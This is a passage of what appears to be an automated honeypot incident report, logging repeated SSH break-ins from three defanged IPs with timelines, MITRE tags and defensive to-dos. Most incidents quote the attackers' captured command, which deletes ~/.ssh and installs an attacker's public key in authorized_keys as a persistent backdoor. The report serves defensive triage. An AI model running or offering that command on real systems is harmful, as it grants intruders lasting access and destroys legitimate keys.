| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:46:58` | `cowrie.session.connect` |
| `2026-06-02 18:46:58` | `cowrie.client.version` |
| `2026-06-02 18:46:58` | `cowrie.client.kex` |
| `2026-06-02 18:46:58` | `cowrie.login.success` |
| `2026-06-02 18:46:58` | `cowrie.session.params` |
| `2026-06-02 18:46:58` | `cowrie.command.input` |
| `2026-06-02 18:46:58` | `cowrie.command.failed` |
| `2026-06-02 18:46:58` | `cowrie.log.closed` |
| `2026-06-02 18:46:59` | `cowrie.session.params` |
| `2026-06-02 18:46:59` | `cowrie.command.input` |
| `2026-06-02 18:46:59` | `cowrie.session.file_download` |
| `2026-06-02 18:46:59` | `cowrie.log.closed` |
| `2026-06-02 18:47:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.95.194[.]52` to AbuseIPDB if not already reported
- [ ] Block `36.95.194[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e681c0a7d38d

| Field | Detail |
|---|---|
| **Source IP** | `36.95.194[.]52` |
| **First Seen** | 2026-06-02 18:47 |
| **Last Seen** | 2026-06-02 18:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:47:00` | `cowrie.session.connect` |
| `2026-06-02 18:47:00` | `cowrie.client.version` |
| `2026-06-02 18:47:00` | `cowrie.client.kex` |
| `2026-06-02 18:47:01` | `cowrie.login.success` |
| `2026-06-02 18:47:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.95.194[.]52` to AbuseIPDB if not already reported
- [ ] Block `36.95.194[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16a636cffc0f

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 18:50 |
| **Last Seen** | 2026-06-02 18:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:50:38` | `cowrie.session.connect` |
| `2026-06-02 18:50:38` | `cowrie.client.version` |
| `2026-06-02 18:50:38` | `cowrie.client.kex` |
| `2026-06-02 18:50:38` | `cowrie.login.success` |
| `2026-06-02 18:50:38` | `cowrie.session.params` |
| `2026-06-02 18:50:38` | `cowrie.command.input` |
| `2026-06-02 18:50:38` | `cowrie.command.failed` |
| `2026-06-02 18:50:39` | `cowrie.log.closed` |
| `2026-06-02 18:50:39` | `cowrie.session.params` |
| `2026-06-02 18:50:39` | `cowrie.command.input` |
| `2026-06-02 18:50:39` | `cowrie.session.file_download` |
| `2026-06-02 18:50:39` | `cowrie.log.closed` |
| `2026-06-02 18:50:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5085367c9e8

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 18:50 |
| **Last Seen** | 2026-06-02 18:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:50:41` | `cowrie.session.connect` |
| `2026-06-02 18:50:41` | `cowrie.client.version` |
| `2026-06-02 18:50:41` | `cowrie.client.kex` |
| `2026-06-02 18:50:41` | `cowrie.login.success` |
| `2026-06-02 18:50:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66745e8e8229

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 18:54 |
| **Last Seen** | 2026-06-02 18:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:54:23` | `cowrie.session.connect` |
| `2026-06-02 18:54:23` | `cowrie.client.version` |
| `2026-06-02 18:54:24` | `cowrie.client.kex` |
| `2026-06-02 18:54:24` | `cowrie.login.success` |
| `2026-06-02 18:54:24` | `cowrie.session.params` |
| `2026-06-02 18:54:24` | `cowrie.command.input` |
| `2026-06-02 18:54:24` | `cowrie.command.failed` |
| `2026-06-02 18:54:24` | `cowrie.log.closed` |
| `2026-06-02 18:54:24` | `cowrie.session.params` |
| `2026-06-02 18:54:24` | `cowrie.command.input` |
| `2026-06-02 18:54:25` | `cowrie.session.file_download` |
| `2026-06-02 18:54:25` | `cowrie.log.closed` |
| `2026-06-02 18:54:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e48301d2c5d

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 18:54 |
| **Last Seen** | 2026-06-02 18:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:54:26` | `cowrie.session.connect` |
| `2026-06-02 18:54:26` | `cowrie.client.version` |
| `2026-06-02 18:54:26` | `cowrie.client.kex` |
| `2026-06-02 18:54:27` | `cowrie.login.success` |
| `2026-06-02 18:54:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4296914d1ea

| Field | Detail |
|---|---|
| **Source IP** | `173.212.228[.]191` |
| **First Seen** | 2026-06-02 18:55 |
| **Last Seen** | 2026-06-02 18:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:55:02` | `cowrie.session.connect` |
| `2026-06-02 18:55:02` | `cowrie.client.version` |
| `2026-06-02 18:55:02` | `cowrie.client.kex` |
| `2026-06-02 18:55:02` | `cowrie.login.success` |
| `2026-06-02 18:55:03` | `cowrie.session.params` |
| `2026-06-02 18:55:03` | `cowrie.command.input` |
| `2026-06-02 18:55:03` | `cowrie.command.failed` |
| `2026-06-02 18:55:03` | `cowrie.log.closed` |
| `2026-06-02 18:55:03` | `cowrie.session.params` |
| `2026-06-02 18:55:03` | `cowrie.command.input` |
| `2026-06-02 18:55:03` | `cowrie.session.file_download` |
| `2026-06-02 18:55:03` | `cowrie.log.closed` |
| `2026-06-02 18:55:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.212.228[.]191` to AbuseIPDB if not already reported
- [ ] Block `173.212.228[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7eb29efae28f

| Field | Detail |
|---|---|
| **Source IP** | `173.212.228[.]191` |
| **First Seen** | 2026-06-02 18:55 |
| **Last Seen** | 2026-06-02 18:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:55:05` | `cowrie.session.connect` |
| `2026-06-02 18:55:05` | `cowrie.client.version` |
| `2026-06-02 18:55:05` | `cowrie.client.kex` |
| `2026-06-02 18:55:06` | `cowrie.login.success` |
| `2026-06-02 18:55:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.212.228[.]191` to AbuseIPDB if not already reported
- [ ] Block `173.212.228[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90576e9a95dd

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 18:56 |
| **Last Seen** | 2026-06-02 18:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:56:11` | `cowrie.session.connect` |
| `2026-06-02 18:56:11` | `cowrie.client.version` |
| `2026-06-02 18:56:11` | `cowrie.client.kex` |
| `2026-06-02 18:56:11` | `cowrie.login.success` |
| `2026-06-02 18:56:12` | `cowrie.session.params` |
| `2026-06-02 18:56:12` | `cowrie.command.input` |
| `2026-06-02 18:56:12` | `cowrie.command.failed` |
| `2026-06-02 18:56:12` | `cowrie.log.closed` |
| `2026-06-02 18:56:12` | `cowrie.session.params` |
| `2026-06-02 18:56:12` | `cowrie.command.input` |
| `2026-06-02 18:56:12` | `cowrie.session.file_download` |
| `2026-06-02 18:56:12` | `cowrie.log.closed` |
| `2026-06-02 18:56:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b54278c49835

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 18:56 |
| **Last Seen** | 2026-06-02 18:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:56:14` | `cowrie.session.connect` |
| `2026-06-02 18:56:14` | `cowrie.client.version` |
| `2026-06-02 18:56:14` | `cowrie.client.kex` |
| `2026-06-02 18:56:14` | `cowrie.login.success` |
| `2026-06-02 18:56:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e8602c5708f

| Field | Detail |
|---|---|
| **Source IP** | `173.212.228[.]191` |
| **First Seen** | 2026-06-02 18:56 |
| **Last Seen** | 2026-06-02 18:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:56:40` | `cowrie.session.connect` |
| `2026-06-02 18:56:40` | `cowrie.client.version` |
| `2026-06-02 18:56:40` | `cowrie.client.kex` |
| `2026-06-02 18:56:41` | `cowrie.login.success` |
| `2026-06-02 18:56:41` | `cowrie.session.params` |
| `2026-06-02 18:56:41` | `cowrie.command.input` |
| `2026-06-02 18:56:41` | `cowrie.command.failed` |
| `2026-06-02 18:56:41` | `cowrie.log.closed` |
| `2026-06-02 18:56:41` | `cowrie.session.params` |
| `2026-06-02 18:56:41` | `cowrie.command.input` |
| `2026-06-02 18:56:41` | `cowrie.session.file_download` |
| `2026-06-02 18:56:41` | `cowrie.log.closed` |
| `2026-06-02 18:56:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.212.228[.]191` to AbuseIPDB if not already reported
- [ ] Block `173.212.228[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-661e84544f7a

| Field | Detail |
|---|---|
| **Source IP** | `173.212.228[.]191` |
| **First Seen** | 2026-06-02 18:56 |
| **Last Seen** | 2026-06-02 18:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:56:43` | `cowrie.session.connect` |
| `2026-06-02 18:56:43` | `cowrie.client.version` |
| `2026-06-02 18:56:44` | `cowrie.client.kex` |
| `2026-06-02 18:56:44` | `cowrie.login.success` |
| `2026-06-02 18:56:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.212.228[.]191` to AbuseIPDB if not already reported
- [ ] Block `173.212.228[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96dddb997c93

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 18:57 |
| **Last Seen** | 2026-06-02 18:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:57:59` | `cowrie.session.connect` |
| `2026-06-02 18:57:59` | `cowrie.client.version` |
| `2026-06-02 18:57:59` | `cowrie.client.kex` |
| `2026-06-02 18:57:59` | `cowrie.login.success` |
| `2026-06-02 18:58:00` | `cowrie.session.params` |
| `2026-06-02 18:58:00` | `cowrie.command.input` |
| `2026-06-02 18:58:00` | `cowrie.command.failed` |
| `2026-06-02 18:58:00` | `cowrie.log.closed` |
| `2026-06-02 18:58:00` | `cowrie.session.params` |
| `2026-06-02 18:58:00` | `cowrie.command.input` |
| `2026-06-02 18:58:00` | `cowrie.session.file_download` |
| `2026-06-02 18:58:00` | `cowrie.log.closed` |
| `2026-06-02 18:58:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b66d90dbf30b

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 18:58 |
| **Last Seen** | 2026-06-02 18:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 18:58:02` | `cowrie.session.connect` |
| `2026-06-02 18:58:02` | `cowrie.client.version` |
| `2026-06-02 18:58:02` | `cowrie.client.kex` |
| `2026-06-02 18:58:02` | `cowrie.login.success` |
| `2026-06-02 18:58:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca476c6703bb

| Field | Detail |
|---|---|
| **Source IP** | `173.212.228[.]191` |
| **First Seen** | 2026-06-02 19:01 |
| **Last Seen** | 2026-06-02 19:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:01:23` | `cowrie.session.connect` |
| `2026-06-02 19:01:23` | `cowrie.client.version` |
| `2026-06-02 19:01:23` | `cowrie.client.kex` |
| `2026-06-02 19:01:24` | `cowrie.login.success` |
| `2026-06-02 19:01:24` | `cowrie.session.params` |
| `2026-06-02 19:01:24` | `cowrie.command.input` |
| `2026-06-02 19:01:24` | `cowrie.command.failed` |
| `2026-06-02 19:01:24` | `cowrie.log.closed` |
| `2026-06-02 19:01:24` | `cowrie.session.params` |
| `2026-06-02 19:01:24` | `cowrie.command.input` |
| `2026-06-02 19:01:24` | `cowrie.session.file_download` |
| `2026-06-02 19:01:24` | `cowrie.log.closed` |
| `2026-06-02 19:01:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.212.228[.]191` to AbuseIPDB if not already reported
- [ ] Block `173.212.228[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac309aab6dd3

| Field | Detail |
|---|---|
| **Source IP** | `173.212.228[.]191` |
| **First Seen** | 2026-06-02 19:01 |
| **Last Seen** | 2026-06-02 19:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:01:26` | `cowrie.session.connect` |
| `2026-06-02 19:01:26` | `cowrie.client.version` |
| `2026-06-02 19:01:27` | `cowrie.client.kex` |
| `2026-06-02 19:01:27` | `cowrie.login.success` |
| `2026-06-02 19:01:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.212.228[.]191` to AbuseIPDB if not already reported
- [ ] Block `173.212.228[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35585787157e

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:01 |
| **Last Seen** | 2026-06-02 19:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:01:27` | `cowrie.session.connect` |
| `2026-06-02 19:01:27` | `cowrie.client.version` |
| `2026-06-02 19:01:27` | `cowrie.client.kex` |
| `2026-06-02 19:01:28` | `cowrie.login.success` |
| `2026-06-02 19:01:28` | `cowrie.session.params` |
| `2026-06-02 19:01:28` | `cowrie.command.input` |
